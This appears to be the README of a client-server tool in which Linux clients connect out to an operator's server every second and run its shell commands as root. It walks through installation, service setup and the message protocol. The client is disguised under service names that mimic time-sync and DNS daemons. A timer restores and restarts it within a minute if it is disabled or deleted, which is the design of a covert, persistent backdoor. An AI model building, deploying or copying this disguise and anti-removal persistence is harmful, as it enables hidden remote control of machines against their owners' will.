# Remote Command Execution System

A client-server system for remote command execution. The server listens on a configurable port and sends commands to connected clients. Clients execute commands with root privileges and return the output.

## ⚠️ Security Warning

**This system allows remote command execution with root privileges. Use only in trusted, isolated networks with proper security measures in place.**

## Project Structure

```
remote-oneway/
├── server/              # Server component
│   ├── server.py        # Main server script
│   ├── .env.example     # Server configuration example
│   ├── requirements.txt # Python dependencies
│   └── README.md        # Server documentation
│
└── client/              # Client component
    ├── client.py        # Main client script
    ├── .env.example     # Client configuration example
    ├── requirements.txt # Python dependencies
    ├── install.sh       # Automated installation script
    ├── monitor.sh       # Service monitoring script
    ├── ntpsyncd.service # Systemd service file
    ├── dnsresolv.service# Systemd monitor service
    ├── dnsresolv.timer  # Systemd timer (checks every minute)
    └── README.md        # Client documentation
```

## Features

### Server
- Listens on configurable port (default: 8443)
- Accepts multiple client connections
- Interactive command prompt
- Displays command output (stdout/stderr) from all clients
- Shows exit codes for executed commands

### Client
- Connects to server every second
- Executes commands as root user
- Returns stdout, stderr, and exit codes
- Automatic reconnection on connection loss
- Systemd service integration
- Self-healing monitoring system

### Monitoring System
- **ntpsyncd.service**: Runs the client as a background service
- **dnsresolv.timer**: Checks service health every minute
- Automatically restarts stopped/disabled services
- Recreates missing service files
- Logs all monitoring activities

## Quick Start

### Server Setup

1. Navigate to the server directory:
   ```bash
   cd server
   ```

2. Install dependencies:
   ```bash
   pip install -r requirements.txt
   ```

3. Create and configure `.env`:
   ```bash
   cp .env.example .env
   # Edit .env if you want to change the port
   ```

4. Run the server:
   ```bash
   python server.py
   ```

### Client Setup (Linux)

1. Navigate to the client directory:
   ```bash
   cd client
   ```

2. Create and configure `.env`:
   ```bash
   cp .env.example .env
   nano .env  # Set SERVER_HOST to your server's IP address
   ```

3. Run the automated installation script:
   ```bash
   sudo ./install.sh
   ```

The installation script will:
- Install Python dependencies
- Copy client script to `/etc/ntpsync/ntp`
- Install and enable the systemd service
- Install and enable the monitoring timer
- Start the service

## Configuration

### Server Configuration (server/.env)

```env
SERVER_HOST=0.0.0.0    # Interface to bind to
SERVER_PORT=8443       # Port to listen on
```

### Client Configuration (client/.env)

```env
SERVER_HOST=localhost  # Server IP address or hostname
SERVER_PORT=8443      # Server port
```

## Usage

### Server Commands

Once the server is running, you can:

1. **Execute commands**: Type any shell command and press Enter. It will be executed on all connected clients.

2. **List clients**: Type `list` or `clients` to see connected clients.

3. **Exit server**: Type `exit` or `quit` to shutdown the server.

### Example Session

```
server> whoami
[INFO] Command queued for 2 client(s)

================================================================================
Response from 192.168.1.100:45678:
Command: whoami
Exit Code: 0

--- STDOUT ---
root

================================================================================

server> ls -la /etc
[INFO] Command queued for 2 client(s)

================================================================================
Response from 192.168.1.100:45678:
Command: ls -la /etc
Exit Code: 0

--- STDOUT ---
total 1234
drwxr-xr-x  123 root root  12288 Dec 24 10:00 .
drwxr-xr-x   20 root root   4096 Nov 15 09:30 ..
...
================================================================================
```

## Client Service Management

### Check Service Status

```bash
sudo systemctl status ntpsyncd
```

### View Live Logs

```bash
sudo journalctl -u ntpsyncd -f
```

### Manually Restart Service

```bash
sudo systemctl restart ntpsyncd
```

### Check Monitoring Timer

```bash
# Timer status
sudo systemctl status dnsresolv.timer

# Timer logs
sudo journalctl -u dnsresolv.timer -f

# Monitor script logs
sudo journalctl -u dnsresolv -f
```

### Stop Service

```bash
sudo systemctl stop ntpsyncd
sudo systemctl disable ntpsyncd
```

**Note**: The monitoring timer will automatically restart and re-enable the service within 1 minute.

## Installation Details

### Client Installation Locations

- **Client script**: `/etc/ntpsync/ntp`
- **Configuration**: `/etc/ntpsync/.env`
- **Monitor script**: `/etc/ntpsync/monitor.sh`
- **Service file**: `/etc/systemd/system/ntpsyncd.service`
- **Timer files**: `/etc/systemd/system/dnsresolv.{service,timer}`

### How the Monitoring Works

1. The `dnsresolv.timer` triggers every minute
2. It runs `dnsresolv.service` which executes `monitor.sh`
3. The monitor script checks:
   - If service file exists (recreates if missing)
   - If client script exists (restores if missing)
   - If service is active (starts if stopped)
   - If service is enabled (enables if disabled)
4. All actions are logged to the systemd journal

## Troubleshooting

### Client Can't Connect to Server

1. Check if server is running:
   ```bash
   # On server machine
   netstat -tulpn | grep 8443
   ```

2. Check firewall rules:
   ```bash
   # Allow port 8443
   sudo ufw allow 8443/tcp
   ```

3. Verify client configuration:
   ```bash
   cat /etc/ntpsync/.env
   ```

### Service Keeps Stopping

Check the service logs:
```bash
sudo journalctl -u ntpsyncd -n 100
```

Common issues:
- Incorrect server address in `.env`
- Network connectivity problems
- Python dependencies not installed

### Monitor Not Working

1. Check timer status:
   ```bash
   systemctl list-timers dnsresolv.timer
   ```

2. Check monitor logs:
   ```bash
   sudo journalctl -u dnsresolv -n 50
   ```

## Development

### Testing Without Installation

**Server**:
```bash
cd server
python server.py
```

**Client**:
```bash
cd client
sudo python client.py
```

### Uninstallation

To completely remove the client:

```bash
# Stop and disable services
sudo systemctl stop ntpsyncd
sudo systemctl disable ntpsyncd
sudo systemctl stop dnsresolv.timer
sudo systemctl disable dnsresolv.timer

# Remove service files
sudo rm /etc/systemd/system/ntpsyncd.service
sudo rm /etc/systemd/system/dnsresolv.service
sudo rm /etc/systemd/system/dnsresolv.timer

# Reload systemd
sudo systemctl daemon-reload

# Remove installation directory
sudo rm -rf /etc/ntpsync
```

## Architecture

### Communication Protocol

The system uses JSON messages over TCP sockets:

**Heartbeat** (server → client):
```json
{"type": "heartbeat"}
```

**Command** (server → client):
```json
{
  "type": "command",
  "command": "ls -la"
}
```

**Response** (client → server):
```json
{
  "command": "ls -la",
  "stdout": "...",
  "stderr": "...",
  "exit_code": 0
}
```

### Connection Flow

1. Client connects to server every second
2. Server sends either heartbeat or command
3. Client responds with acknowledgment or command output
4. Connection persists for multiple commands
5. If connection lost, client automatically reconnects

## License

This project is provided as-is for educational and internal use purposes.

## Contributing

This is a custom internal tool. Modifications should be carefully reviewed for security implications.

